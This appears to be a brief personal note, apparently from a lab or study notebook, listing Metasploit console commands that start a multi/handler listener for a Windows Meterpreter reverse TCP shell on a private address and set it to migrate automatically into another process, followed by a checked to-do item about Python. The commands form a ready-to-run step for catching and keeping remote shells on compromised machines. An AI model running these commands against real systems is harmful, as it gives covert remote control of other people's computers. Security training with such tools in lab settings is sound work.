```
msf6 > use exploit/multi/handler
```

```
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
```

```
msf6 exploit(multi/handler) > set LHOST 172.30.1.29
```

```
msf6 exploit(multi/handler) > set AutoRunScript post/windows/manage/migrate
```

```
msf6 exploit(multi/handler) > exploit
```

- [x] PYthon3  [due:: 2025-04-11]

